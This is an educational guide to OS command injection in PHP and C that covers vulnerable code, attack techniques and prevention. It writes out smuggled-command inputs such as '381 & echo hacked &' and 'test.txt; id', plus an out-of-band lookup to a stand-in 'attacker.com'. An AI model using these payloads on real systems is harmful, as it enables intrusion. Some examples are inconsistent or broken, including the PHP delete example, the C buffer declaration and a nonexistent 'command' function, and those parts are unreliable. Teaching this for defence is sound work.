# OS Command Injection

## What is OS Command Injection?

**OS Command Injection** (also known as shell injection) is a **critical security vulnerability** that allows an attacker to execute arbitrary operating system commands on the server running a vulnerable application.

This happens when an application dynamically constructs system commands using **user-controlled input** without proper validation or sanitization. Attackers can inject malicious commands, leading to full system compromise, data leaks, or pivoting to other internal network systems.

---

## How OS Command Injection Works

**Example:**

A web application allows checking stock status via URL parameters:

    https://insecure-website.com/stockStatus?productID=381&storeID=29


The server runs a shell command like:

    stockreport.pl 381 29


If no input validation is done, an attacker might inject input like:

    381 & echo hacked &


The command becomes:

    stockreport.pl 381 & echo hacked & 29


This executes three commands:
- The original command (likely failing)
- The injected command: `echo hacked` (returns "hacked")
- The last argument: `29` (treated as a separate command, causing an error)

---

## Common OS Command Injection Techniques

- Using **shell metacharacters** like `;`, `&`, `|`, `||`, `&&`, `$()`, `` ` ``, `{}`, `[]` for command separation.
- **Backticks** `` `command` `` or `$()` for command substitution (Unix-based systems).
- **Injecting delays for detection:**  
  - Example: `ping -c 1 127.0.0.1` in blind injection.
- **Redirecting outputs to files for later retrieval:**  
  - Example: `whoami > /var/www/static/output.txt`
- **Out-of-band data exfiltration (OAST)** via DNS lookups:  
  - Example: `nslookup attacker.com`

---

## Useful Commands for Testing

| Purpose             | Linux Command       | Windows Command     |
|---------------------|--------------------|---------------------|
| Current user        | `whoami`           | `whoami`            |
| OS details          | `uname -a`         | `ver`               |
| Network config      | `ifconfig`         | `ipconfig /all`     |
| Network connections | `netstat -an`      | `netstat -an`       |
| Running processes   | `ps -ef`           | `tasklist`          |

---

## Practical Examples

### Vulnerable PHP Example

    <?php $file = $_GET['filename']; system("$file"); ?>

A request to:
      
    http://example.com/delete.php?filename=test.txt; id



 would run `rm test.txt` and then `id`, leaking user info.

---

### Vulnerable C Example
    
    char command;
    strcat(command, "time ");
    strcat(command, argv);
    system(command);


If `argv` is `myprog; ls`, then `ls` executes unexpectedly.

---

## Prevention Strategies

1. **Avoid calling OS commands directly with user input:** Use language-native functions or APIs when possible.
2. **Input validation:** Use a whitelist of safe inputs (e.g., numeric IDs or alphanumeric strings).
3. **Sanitization/escaping:** Escaping alone is error-prone and often bypassed by attackers.
4. **Use parameterized execution methods:** Prefer those that do not invoke a shell, e.g., Java's `Runtime.exec(String[])` over `Runtime.exec(String)`.
5. **Limit privileges:** Run applications with the least privilege necessary to reduce impact.

---

## OS Command Injection and PHP Program Execution Functions

OS command injection occurs when applications invoke system commands with untrusted user input without proper validation or sanitization. PHP provides many functions to execute external commands; improper use can lead to critical vulnerabilities.

---

### Common PHP Functions for Executing OS Commands

| Function           | Description                                                         | Output Handling         |
|--------------------|---------------------------------------------------------------------|------------------------|
| exec()             | Executes external program; returns last output line or array        | Output returned as string |
| passthru()         | Executes external program; raw data to browser                      | Direct output           |
| system()           | Executes external program; outputs result, returns last line string | Displayed & returned output |
| shell_exec()       | Executes command via shell; returns full output                     | Output returned as string |
| command            | Executes shell command, returns full output                         | Output returned as string |
| proc_open()        | Opens process with file pointers (stdin, stdout, stderr)            | Provides process resource |
| proc_close()       | Closes opened process                                               | Returns exit status      |
| proc_terminate()   | Terminates process opened by proc_open()                            | No output               |
| proc_get_status()  | Information about process opened by proc_open()                     | Array with process info |

---

## Escaping and Sanitizing Inputs

- **escapeshellarg()**: Escapes a string for shell arguments by wrapping in single quotes and escaping any internal single quotes.
  - Use for passing user input as shell command parameters to reduce injection risk.
  - **Caveat:** Does not prevent all command injection—some programs (like `tar`, `nmap`) interpret special chars/options, so more validation is needed.
- **escapeshellcmd()**: Escapes shell metacharacters in a string (less comprehensive than `escapeshellarg()`); mainly used before passing an entire command.
- On **Windows**, escaping is more complex (`cmd.exe` parsing rules). `escapeshellarg()` replaces problematic chars like `&` and `!` with spaces and wraps with double quotes.

---

## Summary

OS Command Injection enables attackers to run unauthorized commands on a server, potentially gaining full control. Strong input validation, avoiding direct command execution with user input, and safer alternatives are required for mitigation. Awareness and secure coding practices are critical.

---

## References and Further Reading

- [PortSwigger – What is OS command injection, and how to prevent it?](https://portswigger.net/web-security/os-command-injection)
- [OWASP – Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PHP exec manual](https://www.php.net/manual/en/function.exec.php)

---

This guide covers the key concepts, examples, preventive measures, and resources for understanding OS Command Injection, suitable for GitHub documentation. More code examples or technical deep-dives can be provided upon request.

## Example Usage
    
    // Vulnerable example without escaping (risk of OS command injection)
    $input = $_GET['filename'];
    system("rm $input");
    
    // Safer example with escaping
    $escapedInput = escapeshellarg($_GET['filename']);
    system("rm $escapedInput");


In the safer example, `escapeshellarg()` ensures the filename is treated as a single argument, preventing injection of extra commands.

---

## Important Notes from PHP Manual

- If PHP is chrooted without `/bin/sh`, OS commands might not execute as expected.
- `escapeshellarg()` may strip or alter non-ASCII characters depending on system locale settings—set locale correctly (`setlocale(LC_CTYPE, "en_US.UTF-8")`) for UTF-8 safety.
- Some applications interpret arguments starting with hyphens as options; use `--` to separate arguments from options when supported (e.g., `tar cf archive.tar -- file1 file2`).
- Serialized objects or binary data should be base64-encoded before passing to shell commands because of null byte issues.
- For Windows, additional escaping functions (`escape_win32_argv()`, `escape_win32_cmd()`) exist to properly escape arguments for the Windows shell and API.

---

## Best Practices to Prevent OS Command Injection in PHP

- **Avoid shell execution whenever possible.** Use PHP built-in functions or libraries with native functionality.
- If external commands are necessary, **always validate input** using a whitelist of allowed characters or values.
- Use `escapeshellarg()` for individual arguments and `escapeshellcmd()` for entire command strings.
- Use command option separators like `--` for commands that support it to avoid malicious options injection.
- Consider **running processes with least privileged users** to reduce impact.
